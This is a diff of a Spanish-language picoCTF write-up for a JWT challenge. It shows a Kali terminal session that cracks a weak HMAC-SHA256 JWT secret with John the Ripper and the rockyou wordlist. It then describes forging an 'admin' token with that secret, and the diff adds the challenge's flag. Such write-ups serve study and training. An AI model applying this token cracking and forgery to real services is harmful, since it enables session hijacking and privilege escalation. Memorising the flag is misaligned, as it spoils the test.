@@ -1,24 +1,61 @@
 ### Descripción
-
+Check the admin scratchpad!http://fickle-tempest.picoctf.net:49593
 ### Solución
-Check the admin scratchpad!http://fickle-tempest.picoctf.net:63346
+
 ### Solución 1 - kali
 ```
-└─$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ2lzZWxsZSJ9.6sYqGiyHaWuH2jv0gLoVEyxSEo1fVs91VQSm14hv8AY" >> tooken
+vamos a intentar ingresar pero nuestro nombre no arroja la bandera, admin esta bloqueado, asi que tomamos la cookie la crackearemos, lo que nos arroja la palabra secreta: ilovepico
 
 ┌──(kali㉿kali)-[~]
-└─$ john tooken --wordlist=/usr/share/wordlists/rockyou.txt
+└─$ nano hash       
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ cat hash
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ2lzZWxsZSJ9.6sYqGiyHaWuH2jv0gLoVEyxSEo1fVs91VQSm14hv8AY
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ls usr/share/wordlists
+ls: cannot access 'usr/share/wordlists': No such file or directory
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ls /usr/share/wordlists
+dirb        fasttrack.txt  legion      rockyou.txt  wifite.txt
+dirbuster   fern-wifi      metasploit  sqlmap.txt
+dnsmap.txt  john.lst       nmap.lst    wfuzz
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ls /usr/share/wordlists
+dirb        fasttrack.txt  legion      rockyou.txt  wifite.txt
+dirbuster   fern-wifi      metasploit  sqlmap.txt
+dnsmap.txt  john.lst       nmap.lst    wfuzz
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ head /usr/share/wordlists/rockyou.txt 
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ john hash -w=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
-Will run 2 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-ilovepico        (?)     
-1g 0:00:00:05 DONE (2026-03-02 14:18) 0.1788g/s 1323Kp/s 1323Kc/s 1323KC/s iloverob4live345..ilovemymother@
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed.
+No password hashes left to crack (see FAQ)
+                                                                                                
+┌──(kali㉿kali)-[~]
+└─$ john hash --show
+?:ilovepico
 
-nos grabamos como ilovepico y copiamos la cookie
+1 password hash cracked, 0 left
+
+teniendo la palabra vamos a https://jwt.lannysport.net/ y en lugar de mi nombre puse admin, luego en el VERIFY SIGNATURE puse ilovepico, copie y cambie la nueva cookie, recargue y listo
 ```
 ### Notas adicionales 
-
+picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
 ### Referencias
